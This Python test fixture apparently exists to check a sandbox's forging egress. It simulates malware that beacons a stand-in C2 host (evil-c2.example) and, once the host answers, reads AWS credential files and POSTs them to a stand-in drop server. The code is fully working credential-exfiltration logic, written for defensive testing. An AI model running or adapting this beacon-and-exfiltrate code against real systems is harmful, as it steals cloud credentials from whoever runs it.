#!/usr/bin/env python3
"""
exfil-fixture.py — a CONDITION-GATED exfiltration sample (synthetic, for proving the
deceptive forging egress). This is the exact behavior the old sinkhole could not see:

  1. Beacon the C2. Only if the C2 ANSWERS with success does the sample proceed.
  2. On the green light, read the planted decoy credentials and exfiltrate them.

Under a sinkhole (drops/terminates the first knock), step 1's gate never opens -> the
sample stays DORMANT -> it scores falsely clean. Under the forge (answers as the real
C2), the gate opens -> the sample runs its FULL real payload -> we capture the beacon
AND the credential exfil, with no real packet leaving the host.

Prints CR_FIX_* markers so the test can assert exactly what happened.
"""
import os
import sys
import urllib.request

C2 = os.environ.get("CR_FIX_C2", "https://evil-c2.example/beacon")
EXFIL = os.environ.get("CR_FIX_EXFIL", "https://drop.evil-c2.example/upload")
CRED_PATHS = ["/root/.aws/credentials", os.path.expanduser("~/.aws/credentials")]


def beacon() -> bool:
    """The condition gate: proceed only if the C2 answered 200."""
    try:
        with urllib.request.urlopen(C2, timeout=6) as r:
            r.read(256)
            print(f"CR_FIX_BEACON status={r.status}")
            return r.status == 200
    except Exception as e:  # noqa: BLE001
        print(f"CR_FIX_BEACON_FAIL {type(e).__name__}: {e}")
        return False


def run_payload() -> None:
    creds = ""
    for p in CRED_PATHS:
        if os.path.exists(p):
            creds = open(p, encoding="utf-8", errors="replace").read()
            print(f"CR_FIX_CRED_READ path={p} bytes={len(creds)}")
            break
    else:
        print("CR_FIX_CRED_READ none-found")
    try:
        req = urllib.request.Request(EXFIL, data=creds.encode("utf-8"), method="POST")
        with urllib.request.urlopen(req, timeout=6) as r:
            r.read(256)
            print(f"CR_FIX_EXFIL_SENT status={r.status} bytes={len(creds)}")
    except Exception as e:  # noqa: BLE001
        print(f"CR_FIX_EXFIL_FAIL {type(e).__name__}: {e}")


if __name__ == "__main__":
    if beacon():
        print("CR_FIX_GATE open -> running payload")
        run_payload()
        print("CR_FIX_DONE ran")
    else:
        print("CR_FIX_DONE dormant")
    sys.exit(0)
